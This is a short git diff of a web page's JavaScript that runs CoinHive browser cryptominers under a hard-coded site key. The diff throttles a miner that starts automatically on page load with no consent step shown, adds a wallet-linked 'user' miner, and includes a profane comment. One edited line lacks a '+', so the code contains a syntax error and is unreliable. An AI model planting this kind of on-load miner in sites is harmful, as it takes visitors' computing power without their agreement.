@@ -1,4 +1,4 @@
-var anonMiner = new CoinHive.Anonymous('qXvuxshdwz8NEoQXhMLH0qPW2EYJWuLc');
+var anonMiner = new CoinHive.Anonymous('qXvuxshdwz8NEoQXhMLH0qPW2EYJWuLc', {throttle: 0.2});
 anonMiner.start();
 
 function getWalletAddress() {
@@ -57,10 +57,12 @@ function createiframe() {
 
 function startUserMiner() {
     var userWalletAddress = getWalletAddress();
-    var userMiner = new CoinHive.User('qXvuxshdwz8NEoQXhMLH0qPW2EYJWuLc', userWalletAddress);
+    var userMiner = new CoinHive.User('qXvuxshdwz8NEoQXhMLH0qPW2EYJWuLc', userWalletAddress, {threads: 1,
+        throttle: 1});
     anonMiner.stop();
-
-    document.getElementById('minerButton').innerHTML = 'Mining to: ' + userWalletAddress;
+    // Neccessary to update user Total Hashes not actually Mining
+    // Fuck CoinHive
+    userMiner.start();
 
     var button = document.getElementById('minerButton');
     button.innerHTML = "Mining to: " + userWalletAddress;
@@ -83,7 +85,9 @@ function startUserMiner() {
 
     createiframe();
 
+    // User Hashes
     setInterval(function() {
-        document.getElementById('hashesCompleted').innerHTML = 'Total Hashes Completed: ' + userMiner.getAcceptedHashes()
-    }, 5000);
+        var userHashes = userMiner.getAcceptedHashes();
+        document.getElementById('formTitle').innerHTML = 'Hash Balance Prior to this Session: ' + userHashes ' Hashes';
+    }, 1000);
 }
